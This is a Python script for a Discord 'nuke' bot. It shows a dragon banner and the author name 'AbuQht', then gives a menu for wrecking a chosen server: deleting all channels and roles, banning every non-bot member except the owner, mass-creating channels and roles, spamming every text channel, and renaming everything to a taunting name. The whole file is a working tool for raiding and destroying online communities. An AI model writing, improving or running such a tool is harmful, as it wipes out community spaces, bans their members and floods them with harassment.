import discord, asyncio, random, json, os, shutil, logging
from discord.ext import commands
from rich.console import Console
from rich.theme import Theme

# ====================== ألوان Thallium الأزرق اللامع ======================
thallium_theme = Theme({
    "cyan": "#00f0ff",
    "bright_cyan": "#00ffff",
    "title": "#00ccff",
    "line": "#00ffff",
    "text": "#00eeff",
    "red": "#ff0033",        # لون التوكن فقط
})

console = Console(theme=thallium_theme)

logging.getLogger("discord").setLevel(logging.CRITICAL)
os.system("cls" if os.name == "nt" else "clear")

# ======== Token للبوت ========
console.print("[bold red]→ Enter your Discord Bot Token:[/bold red] ", end="")
TOKEN = input("").strip()

# ======== Config ========
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(SCRIPT_DIR, "config.json")

with open(CONFIG_PATH, "r", encoding="utf-8") as f:
    config = json.load(f)

# ======== Bot ========
intents = discord.Intents.all()
client = commands.Bot(command_prefix=".", intents=intents)
client.remove_command("help")

# ======== Menu ========
async def print_big_menu():
    os.system("cls" if os.name == "nt" else "clear")
    width, _ = shutil.get_terminal_size((100, 30))

    dragon = [
        "                   __====-_  _-====___",
        "              _--^^^#####//      \\\\#####^^^--_",
        "           _-^##########// (    ) \\\\##########^-_",
        "          -############//  |\\^^/|  \\\\############-",
        "        _/############//   (@::@)   \\\\############\\_",
        "       /#############((     \\\\//     ))#############\\",
        "      -###############\\\\    (oo)    //###############-",
        "     -#################\\\\  / UUU \\  //#################-",
        "    -###################\\\\/  (v)  \\/###################-",
        "   _#/|##########/\\######(   /   \\   )######/\\##########|\\#_",
        "   |/ |#/\\#/\\#/\\/  \\#/\\##\\  |(_ ^ _)|  /##/\\#/  \\/\\#/\\#/\\| \\",
        "   `  |/  V  V  `   V  \\\\#\\| \\| | | | |/##/  V   '  V  V \\|  '",
        "      `   `  `      `   / | | | | | | \\  \\   '      '  '   '",
        "                       (  | | | | | |  )",
        "                      __\\ | | | | | | /__",
        "                     (vvv(VVV)(VVV)vvv)"
    ]

    console.print("\n" * 2)
    for line in dragon:
        console.print(line.center(width), style="bright_cyan")
    console.print("\n")

    console.rule("[bold bright_cyan]AbuQht || /MADE AbuQht || By : AbuQht[/bold bright_cyan]")
    console.print("\n")
   
    console.print(" (01) Delete Channels     (02) Create Channels     (03) Delete Roles", style="cyan")
    console.print(" (04) Create Roles        (05) Ban Members         (06) Spam Channels", style="cyan")
    console.print(" (07) Rename Channels     (08) Rename Roles", style="cyan")
   
    console.print("\n[bold bright_cyan]!! By : AbuQht !! [/bold bright_cyan]\n")

    return await asyncio.to_thread(console.input, "[bold bright_cyan](AbuQht) Option: [/bold bright_cyan]")

# ======== Server Selection محسّن ========
async def show_servers():
    os.system("cls" if os.name == "nt" else "clear")
    console.print("[bold bright_cyan][*] Servers the bot can see:[/bold bright_cyan]\n")
    
    guilds = list(client.guilds)
    
    if not guilds:
        console.print("[bold red]No guilds found! Make sure the bot is in servers.[/bold red]")
        return None

    for i, g in enumerate(guilds, 1):
        console.print(f"[bold cyan][{i}] {g.name} (ID: {g.id})[/bold cyan]")

    console.print(f"\n[bold bright_cyan]Total guilds: {len(guilds)}[/bold bright_cyan]\n")
    
    while True:
        try:
            ch = int(await asyncio.to_thread(console.input, "[bold cyan]→ Choose a server: [/bold cyan]"))
            if 1 <= ch <= len(guilds):
                return guilds[ch-1]
        except Exception:
            console.print("[bold red]Invalid choice, try again.[/bold red]")

# ======== Logging ========
async def log_action(coro, msg_id):
    try:
        await coro
        console.print(f"[bold bright_cyan]{msg_id}[/bold bright_cyan]")
    except:
        console.print(f"[bold red]Failed {msg_id}[/bold red]")

# ======== Main Loop ========
async def main():
    guild = await show_servers()
    if guild is None:
        return
    while True:
        option = await print_big_menu()

        if option == "1":  # Delete Channels
            await asyncio.gather(*[
                log_action(ch.delete(), f"Deleted Channel {ch.id}") for ch in guild.channels
            ], return_exceptions=True)

        elif option == "2":  # Create Channels
            amount = int(await asyncio.to_thread(console.input, "Amount: ") or "50")
            await asyncio.gather(*[
                log_action(
                    guild.create_text_channel(random.choice(config["nuke"]["channels_name"]) + f"-{i}"),
                    f"Created Channel {guild.id}{i:03d}"
                ) for i in range(amount)
            ], return_exceptions=True)

        elif option == "3":  # Delete Roles
            roles = [r for r in guild.roles if not r.is_default()]
            await asyncio.gather(*[
                log_action(r.delete(), f"Deleted Role {r.id}") for r in roles
            ], return_exceptions=True)

        elif option == "4":  # Create Roles
            amount = int(await asyncio.to_thread(console.input, "Amount: ") or "50")
            await asyncio.gather(*[
                log_action(
                    guild.create_role(name=random.choice(config["nuke"]["roles_name"])),
                    f"Created Role {i}"
                ) for i in range(amount)
            ], return_exceptions=True)

        elif option == "5":  # Ban Members
            members = [m for m in guild.members if not m.bot and m != guild.owner]
            await asyncio.gather(*[
                log_action(m.ban(), f"Banned {m.id}") for m in members
            ], return_exceptions=True)

        elif option == "6":  # Spam Channels
            amount = int(await asyncio.to_thread(console.input, "Messages per channel: ") or "40")
            tasks = []
            for ch in guild.text_channels:
                for _ in range(amount):
                    tasks.append(ch.send(random.choice(config["nuke"]["messages_content"])))
            await asyncio.gather(*tasks, return_exceptions=True)
            console.print(f"[bold bright_cyan]Spam completed → {amount} messages in every channel![/bold bright_cyan]")

        elif option == "7":  # Rename Channels
            await asyncio.gather(*[
                log_action(ch.edit(name=f"abuqht الفحل"), f"Renamed Channel {ch.id}") for ch in guild.channels
            ], return_exceptions=True)

        elif option == "8":  # Rename Roles
            roles = [r for r in guild.roles if not r.is_default()]
            await asyncio.gather(*[
                log_action(r.edit(name=f"abuqht الفحل"), f"Renamed Role {r.id}") for r in roles
            ], return_exceptions=True)

# ======== Event ========
@client.event
async def on_ready():
    console.print(f"[bold bright_cyan][*] Logged in as {client.user}[/bold bright_cyan]")
    await main()

client.run(TOKEN)